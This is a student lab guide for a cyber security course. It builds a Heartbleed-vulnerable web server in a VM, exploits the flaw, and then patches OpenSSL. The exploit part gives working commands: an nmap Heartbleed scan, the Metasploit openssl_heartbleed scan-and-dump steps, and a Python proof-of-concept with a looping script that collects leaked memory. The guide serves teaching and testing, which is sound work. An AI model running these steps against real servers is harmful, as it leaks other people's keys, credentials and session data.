###########################################
###	HeartBleed Vulnerability	 ###
############################################
by Timur Ozkul

This Heartbleed vulnerability set-up/exploit/bugfix was done for my Msc Cyber Security course in Swansea.

================
Table of Content
================
Part 1: Set up
-----
* Disclaimer *
This instruction is for Virtualbox, other hypervisors may be used but the setup might be slightly different.
Two ways of setting it up either us pre existing VM (considerably quicker) or or create Ubuntu 12.04 (This ubuntu version comes with TLS 1.1) and then a web server
------------------------------------------------------------------------------------
Part 2: Exploit
-----
* Disclaimer *
These instructions use Kali Linux, other Linux OS may be used but might require additional installations.
The square brackets [], indicate that it should be replaced with the appropriate input. Used in bash commands.
I will demonstrate two methods to exploit one with metasploit the other with a python script
------------------------------------------------------------------------------------
Part 3: Bug Fix
-----

------------------------------------------------------------------------------------


Part 1: Set up
================

-- Using pre existing VM --
1. Download custom Linux VM file (bee-box.zip) from https://sourceforge.net/projects/bwapp/files/bee-box/.  
2. On Virtualbox 
	2.1 Click new
	2.2 Name VM anything of your choice
	2.3 For type pick Linux
	2.4 For version pick Ubuntu 64-bit and click next
	2.5 The recommended memory size is fine and click next
	2.6 For Hard disk pick use existing virtual hard disk and pick bee-box.vmdk from downloaded zip and click create
	2.7 Click start
3. Once VM is working go to terminal and use ifconfig command to find the ip address (for use later)
4. On the browser go to http://localhost/bWAPP/login.php
5. Login with username: bee and password: bug
6. On top right under choose your bug find heartbleed vulnerability under A6 and click hack

Now you should have a web server running with the Heartbleed vulnerability on port 8443

-- Creating web server on Ubuntu 12.04 --

1. Download ubuntu12.04 iso from http://www.ubuntu.com/download/alternative-downloads
2. Install OS on a VM (instructions are here: https://ubuntu.com/tutorials/tutorial-install-ubuntu-server)
3. Install Nginx with sudo apt-get install nginx
4. Generate your self-signed ssl key and certificate: 
openssl req -new -x509 -days 365 -sha1 -newkey rsa:1024 
-nodes -keyout heartbleed.key -out heartbleed.crt 
-subj '/O=YourCompany/OU=YourDepartment/CN=www.yoursite.com'
5. Copy your cert to the attacking computer (use sudo update-ca-certificates, update-ca-certificates —refresh)
6. Update your nginx config to add 
  ## SSL
  ssl on;
  ssl_certificate /path/to/your/heartbleed.crt;
  ssl_certificate_key /path/to/your/heartbleed.key;
7. Check the SSL version: openssl version -a
8. Restart nginx server: sudo service nginx restart

------------------------------------------------------------------------------------

Part 2: Exploit
================

1. Ping the VM that was created in part 1, using the ip address (to check if it can create a communication)
2. Use sudo nmap --script ssl-heartbleed -p [port#] [ip] or sudo nmap --script ssl* -p [port#] [ip]
	(this script checks the SSL version to see if it is vulnerable to Heartbleed)
3. Exploit using Metasploit
	3.1 Run msfconsole on terminal
	3.2 Type: search openssl_heartbleed
	3.3 Type: use openssl_heartbleed
	3.4 Type: set RHOSTS [ip]
	3.5 Type: set RPORT [port]
	3.6 Type: set action SCAN, and type: run (this test of the server is vulnerable to Heartbleed)
	3.7 Type: set action DUMP, and type: run (this will dump the memory leak to bin file)
	3.8 Go to the path of the bin file and type: strings [bin file name] 
	(String command shows only the strings of the dump)
	or strings -n 2 [bin file name] (which sets the min of chars)
4. Exploit using python proof of Concept script by Jared Stafford (jspenguin@jspenguin.org) (comments added by me)
	4.1 Download hbexploit.py & loophbexploitfrom https://github.com/timurozkul/HeartBleed.git
	4.2 On the terminal type: python ./hbexploit.py [ip] -p [port]
		(This will output dump onto the terminal window)
	4.3 Alternatively you can use my personal bash script which can make several heartbeat requests and which appends all the output to one file. Use the --help flag for description (makes use of the hbexploit.py script)

The exploit can gives different results so doing several heartbeat request is useful
------------------------------------------------------------------------------------

Part 3: Bug Fix
================
1. sudo apt-get update && sudo apt-get upgrade
2. sudo apt-get install openssl
3. To check if it updated run: openssl version -a
4. Re-run attack scripts

———


